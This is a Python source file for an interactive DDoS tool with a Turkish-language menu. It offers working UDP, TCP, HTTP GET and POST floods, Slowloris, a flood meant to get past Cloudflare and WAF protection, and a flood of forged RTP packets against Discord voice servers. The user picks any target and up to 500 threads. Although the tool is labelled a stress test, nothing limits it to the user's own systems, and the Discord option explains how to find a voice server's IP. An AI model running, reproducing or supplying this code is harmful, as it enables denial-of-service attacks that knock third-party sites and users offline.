import socket
import threading
import time
import random
import struct
import ssl
import requests
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

attack_running = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]


def random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "tr-TR,tr;q=0.9", "de-DE,de;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Pragma": "no-cache",
    }


def udp_flood(target_ip, target_port, duration, stats):
    global attack_running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end_time = time.time() + duration

    while time.time() < end_time and attack_running:
        try:
            sock.sendto(payload, (target_ip, target_port))
            stats["packets"] += 1
            stats["bytes"] += len(payload)
        except Exception:
            stats["errors"] += 1
    sock.close()


def tcp_flood(target_ip, target_port, duration, stats):
    global attack_running
    end_time = time.time() + duration

    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect_ex((target_ip, target_port))
            stats["packets"] += 1
            sock.close()
        except Exception:
            stats["errors"] += 1


def http_flood(target_ip, target_port, duration, stats):
    global attack_running
    end_time = time.time() + duration

    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            headers = random_headers()
            path = f"/?{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}"
            request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\n"
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
            request += "\r\n"
            sock.send(request.encode())
            stats["packets"] += 1
            stats["bytes"] += len(request)
            sock.close()
        except Exception:
            stats["errors"] += 1


def slowloris(target_ip, target_port, duration, stats):
    global attack_running
    sockets_list = []

    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            sockets_list.append(sock)
            stats["packets"] += 1
        except Exception:
            stats["errors"] += 1

    end_time = time.time() + duration
    while time.time() < end_time and attack_running:
        for sock in list(sockets_list):
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                stats["packets"] += 1
            except Exception:
                sockets_list.remove(sock)
                stats["errors"] += 1
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(4)
                    new_sock.connect((target_ip, target_port))
                    new_sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    sockets_list.append(new_sock)
                except Exception:
                    pass
        time.sleep(8)

    for sock in sockets_list:
        try:
            sock.close()
        except Exception:
            pass


def cf_bypass_flood(target_url, duration, stats):
    """HTTPS flood with browser-like headers to bypass basic WAF/CF protection"""
    global attack_running
    end_time = time.time() + duration

    session = requests.Session()

    while time.time() < end_time and attack_running:
        try:
            headers = random_headers()
            headers["Referer"] = target_url
            headers["Sec-Ch-Ua"] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
            headers["Sec-Ch-Ua-Mobile"] = "?0"
            headers["Sec-Ch-Ua-Platform"] = '"Windows"'
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "none"
            headers["Sec-Fetch-User"] = "?1"
            headers["Upgrade-Insecure-Requests"] = "1"

            path = f"?{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))}"
            r = session.get(f"{target_url}/{path}", headers=headers, timeout=5, verify=False, allow_redirects=True)
            stats["packets"] += 1
            stats["bytes"] += len(r.content)
        except Exception:
            stats["errors"] += 1
            session = requests.Session()


def discord_voice_flood(target_ip, target_port, duration, stats):
    """Flood Discord voice server UDP endpoints"""
    global attack_running
    end_time = time.time() + duration

    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            ssrc = random.randint(1, 0xFFFFFFFF)
            seq = random.randint(0, 0xFFFF)
            timestamp = random.randint(0, 0xFFFFFFFF)

            
            rtp_header = struct.pack('>BBHII',
                0x80,           # V=2, P=0, X=0, CC=0
                0x78,           # M=0, PT=120 (opus)
                seq,            # Sequence number
                timestamp,      # Timestamp
                ssrc            # SSRC
            )
            payload = rtp_header + random._urandom(960)

            sock.sendto(payload, (target_ip, target_port))
            stats["packets"] += 1
            stats["bytes"] += len(payload)
            sock.close()
        except Exception:
            stats["errors"] += 1


def http_post_flood(target_ip, target_port, duration, stats):
    """HTTP POST flood with random data payloads"""
    global attack_running
    end_time = time.time() + duration

    while time.time() < end_time and attack_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))

            body = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(100, 1000)))
            headers = random_headers()
            request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n"
            request += f"Content-Length: {len(body)}\r\n"
            request += f"Content-Type: application/x-www-form-urlencoded\r\n"
            for k, v in headers.items():
                request += f"{k}: {v}\r\n"
            request += f"\r\n{body}"

            sock.send(request.encode())
            stats["packets"] += 1
            stats["bytes"] += len(request)
            sock.close()
        except Exception:
            stats["errors"] += 1


def execute_attack(method_name, method_func, target, port, threads_count, duration, is_url=False):
    """Execute the attack and display real-time stats"""
    global attack_running

    if is_url:
        resolved_ip = target
    else:
        try:
            resolved_ip = socket.gethostbyname(target)
        except socket.gaierror:
            console.print("[red]  Host cozumlenemedi.[/red]")
            return

    console.print(f"\n[bold white]  Hedef   : {target} {'(' + resolved_ip + ')' if not is_url else ''}[/bold white]")
    console.print(f"[bold white]  Port    : {port}[/bold white]")
    console.print(f"[bold white]  Metod   : {method_name}[/bold white]")
    console.print(f"[bold white]  Threads : {threads_count}[/bold white]")
    console.print(f"[bold white]  Sure    : {duration}s[/bold white]")

    confirm = console.input("\n[bold yellow]  Baslatilsin mi? (e/h): [/bold yellow]").strip().lower()
    if confirm != "e":
        console.print("[dim]  Iptal edildi.[/dim]")
        return

    attack_running = True
    stats = {"packets": 0, "bytes": 0, "errors": 0}
    threads = []

    for _ in range(threads_count):
        if is_url:
            t = threading.Thread(target=method_func, args=(target, duration, stats), daemon=True)
        else:
            t = threading.Thread(target=method_func, args=(resolved_ip, port, duration, stats), daemon=True)
        t.start()
        threads.append(t)

    console.print(f"\n[bold #a78bfa]  🌕 {method_name} baslatildi! {threads_count} thread aktif.[/bold #a78bfa]")
    console.print(f"[dim]  Ctrl+C ile durdurabilirsiniz.[/dim]\n")

    try:
        start = time.time()
        while time.time() - start < duration and attack_running:
            elapsed = time.time() - start
            pps = stats["packets"] / max(elapsed, 1)
            mbps = (stats["bytes"] / 1024 / 1024) / max(elapsed, 1)
            remaining = int(duration - elapsed)
            console.print(
                f"\r  [magenta]Paket: {stats['packets']:,}  |  "
                f"{mbps:.1f} MB/s  |  "
                f"{pps:.0f} pkt/s  |  "
                f"Hata: {stats['errors']}  |  "
                f"{remaining}s[/magenta]",
                end=""
            )
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    attack_running = False
    console.print(f"\n\n[#a78bfa]  Saldiri tamamlandi.[/#a78bfa]")

    table = Table(title="🌕 Sonuclar", border_style="purple", show_header=True, header_style="bold magenta")
    table.add_column("Metrik", style="bold white", min_width=15)
    table.add_column("Deger", style="#a78bfa")
    table.add_row("Metod", method_name)
    table.add_row("Hedef", f"{target}:{port}" if not is_url else target)
    table.add_row("Toplam Paket", f"{stats['packets']:,}")
    table.add_row("Toplam Veri", f"{stats['bytes'] / 1024 / 1024:.1f} MB")
    table.add_row("Hatalar", str(stats["errors"]))
    table.add_row("Sure", f"{duration}s")
    table.add_row("Ort. PPS", f"{stats['packets'] / max(duration, 1):,.0f}")
    console.print()
    console.print(table)


def get_attack_params():
    """Common parameter input"""
    target = console.input("[bold white]  Hedef IP/Domain: [/bold white]").strip()
    port = console.input("[bold white]  Port (varsayilan 80): [/bold white]").strip()
    port = int(port) if port.isdigit() else 80
    threads_count = console.input("[bold white]  Thread sayisi (varsayilan 50): [/bold white]").strip()
    threads_count = min(int(threads_count) if threads_count.isdigit() else 50, 500)
    duration = console.input("[bold white]  Sure saniye (varsayilan 30): [/bold white]").strip()
    duration = min(int(duration) if duration.isdigit() else 30, 300)
    return target, port, threads_count, duration


def run():
    global attack_running

    while True:
        console.print()
        console.print(f"  [bold purple]🌙 DDoS / STRESS TEST[/bold purple]")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")
        console.print(f"   [#a78bfa][1][/#a78bfa] UDP Flood")
        console.print(f"   [#a78bfa][2][/#a78bfa] TCP SYN Flood")
        console.print(f"   [#a78bfa][3][/#a78bfa] HTTP GET Flood")
        console.print(f"   [#a78bfa][4][/#a78bfa] HTTP POST Flood")
        console.print(f"   [#a78bfa][5][/#a78bfa] Slowloris")
        console.print(f"   [bold red][6][/bold red] Cloudflare Bypass")
        console.print(f"   [bold red][7][/bold red] Discord Voice Flood")
        console.print(f"   [dim][0][/dim] Geri don")
        console.print(f"  [dim #4a2c8a]{'─' * 50}[/dim #4a2c8a]")

        try:
            choice = console.input("\n[bold magenta]  ddos [/bold magenta][bold white]> [/bold white]").strip()

            if choice == "0" or choice.lower() == "back":
                break

            if choice in ("1", "2", "3", "4", "5"):
                methods = {
                    "1": ("UDP Flood", udp_flood),
                    "2": ("TCP SYN Flood", tcp_flood),
                    "3": ("HTTP GET Flood", http_flood),
                    "4": ("HTTP POST Flood", http_post_flood),
                    "5": ("Slowloris", slowloris),
                }
                name, func = methods[choice]
                target, port, threads, dur = get_attack_params()
                if target:
                    execute_attack(name, func, target, port, threads, dur)

            elif choice == "6":
                console.print("\n[bold red]  Cloudflare Bypass Flood[/bold red]")
                console.print("[dim]  Tam URL girin (https://hedef.com)[/dim]")
                target_url = console.input("[bold white]  URL: [/bold white]").strip()
                if not target_url:
                    console.print("[red]  URL gerekli.[/red]")
                    continue
                if not target_url.startswith("http"):
                    target_url = "https://" + target_url

                threads_count = console.input("[bold white]  Thread sayisi (varsayilan 100): [/bold white]").strip()
                threads_count = min(int(threads_count) if threads_count.isdigit() else 100, 500)
                duration = console.input("[bold white]  Sure saniye (varsayilan 60): [/bold white]").strip()
                duration = min(int(duration) if duration.isdigit() else 60, 300)

                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

                execute_attack("CF Bypass Flood", cf_bypass_flood, target_url, 443, threads_count, duration, is_url=True)

            elif choice == "7":
                console.print("\n[bold red]  Discord Voice Channel Flood[/bold red]")
                console.print("[dim]  Discord voice server IP ve port girin.[/dim]")
                console.print("[dim]  Voice IP: Discord'da ses kanailna baglanip, network trafikten bulunabilir.[/dim]")
                target_ip = console.input("[bold white]  Voice Server IP: [/bold white]").strip()
                target_port = console.input("[bold white]  Voice Port (varsayilan 443): [/bold white]").strip()
                target_port = int(target_port) if target_port.isdigit() else 443

                threads_count = console.input("[bold white]  Thread sayisi (varsayilan 100): [/bold white]").strip()
                threads_count = min(int(threads_count) if threads_count.isdigit() else 100, 500)
                duration = console.input("[bold white]  Sure saniye (varsayilan 30): [/bold white]").strip()
                duration = min(int(duration) if duration.isdigit() else 30, 300)

                if target_ip:
                    execute_attack("Discord Voice Flood", discord_voice_flood, target_ip, target_port, threads_count, duration)

            else:
                console.print("[red]  Gecersiz secim.[/red]")

        except KeyboardInterrupt:
            attack_running = False
            console.print("\n[dim]  Durduruldu.[/dim]")
        except ValueError:
            console.print("[red]  Gecersiz deger.[/red]")
        except Exception as e:
            console.print(f"[red]  Hata: {e}[/red]")
